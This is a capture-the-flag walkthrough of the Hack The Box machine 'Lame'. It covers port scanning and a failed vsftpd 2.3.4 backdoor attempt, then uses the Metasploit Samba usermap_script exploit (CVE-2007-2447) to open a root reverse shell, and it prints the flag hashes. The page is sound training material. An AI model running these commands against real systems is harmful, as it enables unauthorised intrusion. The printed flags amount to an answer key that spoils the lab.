---
title: "Lame - Writeup"
linkTitle: "Lame"
weight: 1
featured: true
platform: "HTB"
name: "Lame"
os: "Linux"
difficulty: "Easy"
points: 20
release: "14 Mar 2017"
ip: "10.129.27.149"
# Drop a real avatar at static/img/htb/lame.png and uncomment:
# avatar: "/img/htb/lame.png"
tags: ["linux", "samba", "cve-2007-2447", "usermap-script", "metasploit", "root-shell"]
description: "Easy Linux box, HTB's very first machine. A vsftpd backdoor attempt goes nowhere, but Samba's usermap_script vulnerability gives root in one Metasploit command."
---

{{< htb name="Lame" os="Linux" difficulty="Easy" points="20" release="14 Mar 2017" ip="10.129.27.149" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 10.129.27.149
```

```
Open 10.129.27.149:21
Open 10.129.27.149:22
Open 10.129.27.149:139
Open 10.129.27.149:445
Open 10.129.27.149:3632
```

```
(root㉿kali)# nmap 10.129.27.149 -p21,22,139,445,3632 -sCV
```

```
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

```
| smb-os-discovery:
|   Computer name: lame
|   Domain name: hackthebox.gr
|_  FQDN: lame.hackthebox.gr
```

Four separate services with public exploit histories on one box, vsftpd 2.3.4, this exact Samba build, and distccd all have known CVEs.

## Enumeration

vsftpd 2.3.4 is famous for its backdoor, try that first since it's usually the fastest win when it applies.

```
(root㉿kali)# searchsploit vsftpd 2.3.4
```

```
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
```

```
(root㉿kali)# searchsploit -m unix/remote/49757.py
(root㉿kali)# python 49757.py 10.129.27.149
```

No shell, this particular instance isn't actually backdoored despite the version match, a dead end. Samba's version is the next lead.

```
(root㉿kali)# searchsploit Samba 3.0.20
```

```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb
```

CVE-2007-2447, the `usermap_script` vulnerability, matches this exact version range.

## Initial Foothold

```
(root㉿kali)# msfconsole
msf6 > search Samba 3.0.20
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOST 10.129.27.149
msf6 exploit(usermap_script) > set LHOST 10.10.15.249
msf6 exploit(usermap_script) > exploit
```

```
[*] Started reverse TCP handler on 10.10.15.249:4444
[*] Command shell session 1 opened (10.10.15.249:4444 -> 10.129.27.149:55781)
```

## Privilege Escalation

None needed. `smbd` on this build runs as root, so the command injection lands with full privileges immediately.

```
cat root.txt
```

```
efb1d4a1feca363160f6622415c4feeb
```

```
cd home
find . | grep user.txt
```

```
./makis/user.txt
```

```
cat ./makis/user.txt
```

```
2b76dcf34dc75acfc25b1075c5801214
```

## Lessons learned

- A version match isn't a guarantee. The vsftpd backdoor is one of the most famous exploits in the field, but this particular install wasn't actually vulnerable despite reporting the exact version, always have a second lead ready.
- With several old, exploitable services on one box, prioritize by exploit reliability and impact. Samba's `usermap_script` is a single command straight to root, worth trying before the more situational distccd RCE that was also sitting on this box.
- Some exploits skip privilege escalation entirely because of how the vulnerable service itself runs. Confirm what user the shell landed as immediately, `id` or a direct flag read settles it faster than assuming more steps are needed.
